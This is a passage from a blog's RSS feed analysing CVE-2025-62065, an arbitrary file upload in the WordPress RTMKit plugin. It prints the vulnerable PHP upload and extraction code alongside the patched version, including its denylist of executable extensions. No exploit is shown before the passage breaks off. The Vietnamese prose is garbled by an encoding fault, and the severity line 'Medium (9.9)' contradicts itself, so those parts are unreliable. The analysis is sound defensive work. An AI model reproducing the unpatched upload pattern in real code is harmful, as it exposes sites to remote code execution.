1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nguy√™n nh√¢n: ki·ªÉm tra MIME y·∫øu, kh√¥ng ch·∫∑n ph·∫ßn m·ªü r·ªông nguy hi·ªÉm.&lt;/li&gt;&#xA;&lt;li&gt;B·∫£n v√° (‚â• 4.2.7): th√™m x√°c th·ª±c b·∫±ng &lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt; v√† danh s√°ch denylist.&lt;/li&gt;&#xA;&lt;li&gt;C√°ch kh·∫Øc ph·ª•c: c·∫≠p nh·∫≠t plugin, ch·∫∑n th·ª±c thi PHP trong th∆∞ m·ª•c cache, x√≥a file l·∫°.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/podlove-podcasting-plugin-for-wordpress/vulnerability/wordpress-podlove-podcast-publisher-plugin-4-2-6-unauthenticated-arbitrary-file-upload-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Podlove Podcast Publisher Plugin &amp;lt;= 4.2.6 is vulnerable to Arbitrary File Upload &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-62065 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-04-cve-2025-62065/</link>
      <pubDate>Tue, 04 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-04-cve-2025-62065/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-04-cve-2025-62065/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-62065&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-62065&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.6.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.6.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/rometheme-for-elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress RTMKit Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;RTMKit&lt;/strong&gt;: &lt;strong&gt;1.6.5&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;1.6.6&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://wordpress.org/plugins/elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Elementor&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;function rtm_handle_upload_template()&#xA;{&#xA;    check_ajax_referer(&amp;#39;rtm_template_nonce&amp;#39;, &amp;#39;nonce&amp;#39;);&#xA;&#xA;    if (empty($_FILES[&amp;#39;file&amp;#39;])) {&#xA;        wp_send_json_error(&amp;#39;Tidak ada file yang diupload.&amp;#39;);&#xA;    }&#xA;&#xA;    $file = $_FILES[&amp;#39;file&amp;#39;];&#xA;    $ext = strtolower(pathinfo($file[&amp;#39;name&amp;#39;], PATHINFO_EXTENSION));&#xA;    if ($ext !== &amp;#39;zip&amp;#39;) {&#xA;        wp_send_json_error(&amp;#39;Hanya file .zip yang diperbolehkan.&amp;#39;);&#xA;    }&#xA;&#xA;    $upload_dir = wp_upload_dir();&#xA;    // path di server&#xA;    $tmpFilePath = $upload_dir[&amp;#39;basedir&amp;#39;] . &amp;#39;/rtm_temp_&amp;#39; . wp_unique_filename($upload_dir[&amp;#39;basedir&amp;#39;], $file[&amp;#39;name&amp;#39;]);&#xA;&#xA;    // URL publik&#xA;    $tmpFileUrl  = $upload_dir[&amp;#39;baseurl&amp;#39;] . &amp;#39;/&amp;#39; . basename($tmpFilePath);&#xA;&#xA;    if (!move_uploaded_file($file[&amp;#39;tmp_name&amp;#39;], $tmpFilePath)) {&#xA;        wp_send_json_error(&amp;#39;Gagal menyimpan file sementara.&amp;#39;);&#xA;    }&#xA;&#xA;    $res = $this-&amp;gt;template_extract($tmpFileUrl, $file[&amp;#39;name&amp;#39;], true);&#xA;&#xA;    // setelah selesai hapus file&#xA;    if (file_exists($tmpFilePath)) unlink($tmpFilePath);&#xA;    if ($res) {&#xA;        wp_send_json_success(&amp;#39;Template berhasil diupload dan diekstrak.&amp;#39;);&#xA;    } else {&#xA;        wp_send_json_error($res);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;function template_extract($url, $id, $return = false)&#xA;{&#xA;    $upload_dir = wp_upload_dir();&#xA;    $custom_dir = $upload_dir[&amp;#39;basedir&amp;#39;] . &amp;#39;/rometheme_template&amp;#39;;&#xA;    $tempFile = wp_tempnam($url);&#xA;&#xA;    $hashId = wp_hash($id);&#xA;    $targetDir = $custom_dir . &amp;#39;/&amp;#39; . $hashId;&#xA;&#xA;    $response = wp_remote_get($url, [&amp;#39;timeout&amp;#39; =&amp;gt; 300]);&#xA;&#xA;    if (is_wp_error($response)) {&#xA;        wp_send_json_error($response-&amp;gt;get_error_message());&#xA;    }&#xA;&#xA;    $fileContent = wp_remote_retrieve_body($response);&#xA;&#xA;    file_put_contents($tempFile, $fileContent);&#xA;&#xA;    $zip = new ZipArchive();&#xA;    if ($zip-&amp;gt;open($tempFile) === TRUE) {&#xA;        wp_mkdir_p($targetDir);&#xA;        $zip-&amp;gt;extractTo($targetDir);&#xA;        $zip-&amp;gt;close();&#xA;        unlink($tempFile);&#xA;&#xA;        $option = get_option(&amp;#39;rtm_template_installed&amp;#39;, []); // Default ke array jika tidak ada option&#xA;        if (!is_array($option)) {&#xA;            $option = []; // Pastikan $option adalah array&#xA;        }&#xA;        $option[$hashId] = [&#xA;            &amp;#39;template_id&amp;#39; =&amp;gt; $id&#xA;        ];&#xA;&#xA;        update_option(&amp;#39;rtm_template_installed&amp;#39;, $option); // Simpan kembali ke database&#xA;&#xA;        if ($return) {&#xA;            return true;&#xA;        } else {&#xA;            wp_send_json_success([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;success extract&amp;#39;, &amp;#39;template&amp;#39; =&amp;gt; $hashId]);&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phi√™n b·∫£n l·ªói:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kh√¥ng ki·ªÉm tra quy·ªÅn ng∆∞·ªùi d√πng h·ª£p l·ªá:&lt;/strong&gt; ch·ªâ g·ªçi &lt;code&gt;check_ajax_referer()&lt;/code&gt; nh∆∞ng kh√¥ng ki·ªÉm tra capability (v√≠ d·ª• &lt;code&gt;current_user_can&lt;/code&gt;) ‚Üí user c√≥ nonce h·ª£p l·ªá ho·∫∑c nonce b·ªã l·ªô v·∫´n c√≥ th·ªÉ upload.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;L∆∞u file t·∫°m v√†o th∆∞ m·ª•c public (&lt;code&gt;wp_upload_dir()&lt;/code&gt;):&lt;/strong&gt; &lt;code&gt;$tmpFilePath&lt;/code&gt; n·∫±m trong &lt;code&gt;uploads/&lt;/code&gt; n√™n c√≥ th·ªÉ truy c·∫≠p qua URL (&lt;code&gt;$tmpFileUrl&lt;/code&gt;) trong th·ªùi gian file t·ªìn t·∫°i.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;L·∫•y l·∫°i file qua URL public tr∆∞·ªõc khi gi·∫£i n√©n:&lt;/strong&gt; &lt;code&gt;template_extract()&lt;/code&gt; d√πng &lt;code&gt;wp_remote_get($tmpFileUrl)&lt;/code&gt; ‚Üí ph·ª• thu·ªôc v√†o URL c√¥ng khai.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Gi·∫£i n√©n tr·ª±c ti·∫øp v√†o th∆∞ m·ª•c public:&lt;/strong&gt; &lt;code&gt;extractTo($targetDir)&lt;/code&gt; trong &lt;code&gt;uploads/rometheme_template&lt;/code&gt; ‚Üí n·∫øu file .php ƒë∆∞·ª£c ch√©p l√™n, web server c√≥ th·ªÉ th·ª±c thi.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kh√¥ng whitelist/deny extension:&lt;/strong&gt; kh√¥ng lo·∫°i b·ªè ho·∫∑c t·ª´ ch·ªëi c√°c file th·ª±c thi (&lt;code&gt;.php&lt;/code&gt;, &lt;code&gt;.phtml&lt;/code&gt;, &lt;code&gt;.phar&lt;/code&gt;, &lt;code&gt;.sh&lt;/code&gt;, &lt;code&gt;.exe&lt;/code&gt;, &amp;hellip;).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kh√¥ng ki·ªÉm tra n·ªôi dung file (embedded PHP):&lt;/strong&gt; kh√¥ng c√≥ b∆∞·ªõc ƒë·ªçc/scan ƒë·ªÉ ph√°t hi·ªán &lt;code&gt;&amp;lt;?php&lt;/code&gt; tr∆∞·ªõc khi l∆∞u.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;R·ªßi ro t·∫°m th·ªùi public:&lt;/strong&gt; v√¨ file t·∫°m l√† public trong su·ªët qu√° tr√¨nh, k·∫ª t·∫•n c√¥ng c√≥ th·ªùi gian truy c·∫≠p/thi·∫øt l·∫≠p payload tr∆∞·ªõc khi file b·ªã unlink.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;=&amp;gt; Kh·∫£ nƒÉng RCE r·∫•t cao.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function rtm_handle_upload_template()&#xA;{&#xA;    check_ajax_referer(&amp;#39;rtm_template_nonce&amp;#39;, &amp;#39;nonce&amp;#39;);&#xA;&#xA;    if (empty($_FILES[&amp;#39;file&amp;#39;])) {&#xA;        wp_send_json_error(&amp;#39;No File Uploaded.&amp;#39;);&#xA;    }&#xA;&#xA;    if (! current_user_can(&amp;#39;manage_options&amp;#39;)) {&#xA;        wp_send_json_error(&#xA;            array(&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Insufficient permissions&amp;#39;),&#xA;            403&#xA;        );&#xA;    }&#xA;&#xA;    $file = $_FILES[&amp;#39;file&amp;#39;];&#xA;    $ext  = strtolower(pathinfo($file[&amp;#39;name&amp;#39;], PATHINFO_EXTENSION));&#xA;    if ($ext !== &amp;#39;zip&amp;#39;) {&#xA;        wp_send_json_error(&amp;#39;Only .zip file allowed.&amp;#39;);&#xA;    }&#xA;    $upload_dir = wp_upload_dir();&#xA;    // Direktori aman (bukan langsung ke uploads publik)&#xA;    $base_safe_dir = $upload_dir[&amp;#39;basedir&amp;#39;] . &amp;#39;//rometheme_template/&amp;#39;;&#xA;    $tmp_dir       = $base_safe_dir . &amp;#39;tmp/&amp;#39;;&#xA;    if (! file_exists($tmp_dir)) {&#xA;        wp_mkdir_p($tmp_dir);&#xA;        // cegah eksekusi file php di folder ini&#xA;        @file_put_contents(&#xA;            $base_safe_dir . &amp;#39;.htaccess&amp;#39;,&#xA;            &amp;#34;Options -Indexes &amp;lt;FilesMatch &amp;#34;.(php|phtml|phar)$&amp;#34;&amp;gt;  Deny from all&amp;lt;/FilesMatch&amp;gt;&amp;#34;&#xA;        );&#xA;    }&#xA;&#xA;    // Buat nama unik untuk zip&#xA;    $unique       = wp_generate_password(12, false);&#xA;    $tmp_zip_path = $tmp_dir . &amp;#39;upload_&amp;#39; . $unique . &amp;#39;.zip&amp;#39;;&#xA;&#xA;    // Simpan file upload ke lokasi aman&#xA;    if (! move_uploaded_file($file[&amp;#39;tmp_name&amp;#39;], $tmp_zip_path)) {&#xA;        wp_send_json_error(&#xA;            array(&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Failed save temporary file.&amp;#39;),&#xA;            500&#xA;        );&#xA;    }&#xA;&#xA;    // Proses ekstraksi dengan fungsi aman&#xA;    $res = $this-&amp;gt;template_extract_secure($tmp_zip_path, $file[&amp;#39;name&amp;#39;], true);&#xA;&#xA;    // Hapus zip sementara&#xA;    if (file_exists($tmp_zip_path)) {&#xA;        @unlink($tmp_zip_path);&#xA;    }&#xA;&#xA;    if ($res) {&#xA;        wp_send_json_success(&amp;#39;Template has been successfully extracted.&amp;#39;);&#xA;    } else {&#xA;        wp_send_json_error(&amp;#39;Failed extracting template.&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;function template_extract_secure($zip_path, $id, $return = false)&#xA;{&#xA;    if (empty($zip_path) || ! file_exists($zip_path)) {&#xA;        return $return ? false : wp_send_json_error([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Zip file not found.&amp;#39;], 400);&#xA;    }&#xA;&#xA;    $zip_path = realpath($zip_path);&#xA;    if (strpos($zip_path, realpath(WP_CONTENT_DIR)) !== 0) {&#xA;        return $return ? false : wp_send_json_error([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Invalid zip location.&amp;#39;, &amp;#39;path&amp;#39; =&amp;gt; $zip_path], 403);&#xA;    }&#xA;&#xA;    $upload_dir = wp_upload_dir();&#xA;    $hashId     = wp_hash($id);&#xA;    $base_dir   = $upload_dir[&amp;#39;basedir&amp;#39;] . &amp;#39;/rometheme_template&amp;#39;;&#xA;    $targetDir  = $base_dir . &amp;#39;/&amp;#39; . $hashId . &amp;#39;/&amp;#39;;&#xA;&#xA;    // buat base dir &amp;#43; proteksi root&#xA;    if (! file_exists($base_dir)) {&#xA;        wp_mkdir_p($base_dir);&#xA;        @file_put_contents($base_dir . &amp;#39;/.htaccess&amp;#39;, &amp;#34;Options -Indexes&amp;lt;FilesMatch &amp;#34;.(php|phtml|phar)$\&amp;#34;&amp;gt; Deny from all&amp;lt;/FilesMatch&amp;gt;&amp;#34;);&#xA;    }&#xA;    if (! file_exists($targetDir)) {&#xA;        wp_mkdir_p($targetDir);&#xA;        @file_put_contents($targetDir . &amp;#39;index.html&amp;#39;, &amp;#39;&amp;lt;!-- protected --&amp;gt;&amp;#39;);&#xA;    }&#xA;&#xA;    $zip = new ZipArchive();&#xA;    if ($zip-&amp;gt;open($zip_path) !== true) {&#xA;        return $return ? false : wp_send_json_error([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Invalid or corrupt zip.&amp;#39;], 400);&#xA;    }&#xA;&#xA;    // whitelist extension&#xA;    $allowed_ext = [&amp;#39;jpg&amp;#39;, &amp;#39;jpeg&amp;#39;, &amp;#39;png&amp;#39;, &amp;#39;gif&amp;#39;, &amp;#39;svg&amp;#39;, &amp;#39;webp&amp;#39;, &amp;#39;json&amp;#39;, &amp;#39;css&amp;#39;, &amp;#39;js&amp;#39;, &amp;#39;txt&amp;#39;, &amp;#39;html&amp;#39;, &amp;#39;htm&amp;#39;, &amp;#39;md&amp;#39;];&#xA;&#xA;    // cek isi zip&#xA;    for ($i = 0; $i &amp;lt; $zip-&amp;gt;numFiles; $i&amp;#43;&amp;#43;) {&#xA;        $entry = $zip-&amp;gt;getNameIndex($i);&#xA;        if (substr($entry, -1) === &amp;#39;/&amp;#39;) continue;&#xA;&#xA;        $normalized = str_replace(&amp;#39;\\&amp;#39;, &amp;#39;/&amp;#39;, $entry);&#xA;&#xA;        // block traversal / absolute&#xA;        if (strpos($normalized, &amp;#39;../&amp;#39;) !== false || substr($normalized, 0, 1) === &amp;#39;/&amp;#39; || preg_match(&amp;#39;/^[A-Za-z]:\\\\/&amp;#39;, $entry)) {&#xA;            $zip-&amp;gt;close();&#xA;            error_log(&amp;#34;[rtm] rejected: traversal ($entry)&amp;#34;);&#xA;            return $return ? false : wp_send_json_error([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Zip contains invalid paths.&amp;#39;], 400);&#xA;        }&#xA;&#xA;        $entry_ext = strtolower(pathinfo($entry, PATHINFO_EXTENSION));&#xA;        if (empty($entry_ext) || in_array($entry_ext, [&amp;#39;php&amp;#39;, &amp;#39;phtml&amp;#39;, &amp;#39;phar&amp;#39;, &amp;#39;exe&amp;#39;, &amp;#39;sh&amp;#39;, &amp;#39;pl&amp;#39;, &amp;#39;cgi&amp;#39;], true)) {&#xA;            $zip-&amp;gt;close();&#xA;            error_log(&amp;#34;[rtm] rejected: bad extension ($entry)&amp;#34;);&#xA;            return $return ? false : wp_send_json_error([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Zip contains disallowed file types.&amp;#39;], 400);&#xA;        }&#xA;&#xA;        if (! in_array($entry_ext, $allowed_ext, true)) {&#xA;            $zip-&amp;gt;close();&#xA;            error_log(&amp;#34;[rtm] rejected: unsupported ext $entry_ext ($entry)&amp;#34;);&#xA;            return $return ? false : wp_send_json_error([&amp;#39;message&amp;#39; =&amp;gt; &amp;#34;Unsupported file type: $entry_ext&amp;#34;], 400);&#xA;        }&#xA;    }&#xA;&#xA;    // ekstrak dengan struktur folder asli&#xA;    for ($i = 0; $i &amp;lt; $zip-&amp;gt;numFiles; $i&amp;#43;&amp;#43;) {&#xA;        $entry = $zip-&amp;gt;getNameIndex($i);&#xA;        if (substr($entry, -1) === &amp;#39;/&amp;#39;) continue;&#xA;&#xA;        $entry_ext = strtolower(pathinfo($entry, PATHINFO_EXTENSION));&#xA;        if (! in_array($entry_ext, $allowed_ext, true)) continue;&#xA;&#xA;        $normalized = str_replace(&amp;#39;\\&amp;#39;, &amp;#39;/&amp;#39;, $entry);&#xA;        $safe_name  = sanitize_file_name(basename($normalized));&#xA;        $subdir     = dirname($normalized);&#xA;&#xA;        $final_dir  = $targetDir . ($subdir !== &amp;#39;.&amp;#39; ? $subdir . &amp;#39;/&amp;#39; : &amp;#39;&amp;#39;);&#xA;        wp_mkdir_p($final_dir);&#xA;&#xA;        $target_path = $final_dir . $safe_name;&#xA;&#xA;        $stream = $zip-&amp;gt;getStream($entry);&#xA;        if ($stream === false) continue;&#xA;&#xA;        $out = fopen($target_path, &amp;#39;w&amp;#39;);&#xA;        if ($out === false) {&#xA;            fclose($stream);&#xA;            continue;&#xA;        }&#xA;&#xA;        while (! feof($stream)) fwrite($out, fread($stream, 8192));&#xA;        fclose($out);&#xA;        fclose($stream);&#xA;&#xA;        // detect embedded php&#xA;        $head = @file_get_contents($target_path, false, null, 0, 512);&#xA;        if ($head !== false &amp;amp;&amp;amp; stripos($head, &amp;#39;&amp;lt;?php&amp;#39;) !== false) {&#xA;            @unlink($target_path);&#xA;            error_log(&amp;#34;[rtm] removed suspicious file ($target_path)&amp;#34;);&#xA;            continue;&#xA;        }&#xA;&#xA;        // sanity check ‚Üí skip mismatch untuk json agar manifest.json tidak kehapus&#xA;        $check = wp_check_filetype_and_ext($target_path, $safe_name);&#xA;        if ($entry_ext !== &amp;#39;json&amp;#39; &amp;amp;&amp;amp; $check &amp;amp;&amp;amp; isset($check[&amp;#39;ext&amp;#39;]) &amp;amp;&amp;amp; $check[&amp;#39;ext&amp;#39;] !== $entry_ext) {&#xA;            @unlink($target_path);&#xA;            error_log(&amp;#34;[rtm] removed mismatch file ($target_path)&amp;#34;);&#xA;            continue;&#xA;        }&#xA;    }&#xA;&#xA;    $zip-&amp;gt;close();&#xA;&#xA;    // update option&#xA;    $option = get_option(&amp;#39;rtm_template_installed&amp;#39;, []);&#xA;    if (! is_array($option)) $option = [];&#xA;    $option[$hashId] = [&amp;#39;template_id&amp;#39; =&amp;gt; $hashId, &amp;#39;created&amp;#39; =&amp;gt; current_time(&amp;#39;mysql&amp;#39;)];&#xA;    update_option(&amp;#39;rtm_template_installed&amp;#39;, $option);&#xA;&#xA;    return $return ? true : wp_send_json_success([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;success extract&amp;#39;, &amp;#39;template&amp;#39; =&amp;gt; $hashId]);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Ki·ªÉm tra quy·ªÅn ng∆∞·ªùi d√πng:&lt;/strong&gt; th√™m &lt;code&gt;current_user_can(&#39;manage_options&#39;)&lt;/code&gt; ‚Üí ch·ªâ admin m·ªõi ƒë∆∞·ª£c upload.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;ƒê∆∞a file t·∫°m v√†o th∆∞ m·ª•c an to√†n, kh√¥ng public:&lt;/strong&gt; d√πng &lt;code&gt;wp_upload_dir()&lt;/code&gt; nh∆∞ng t·∫°o 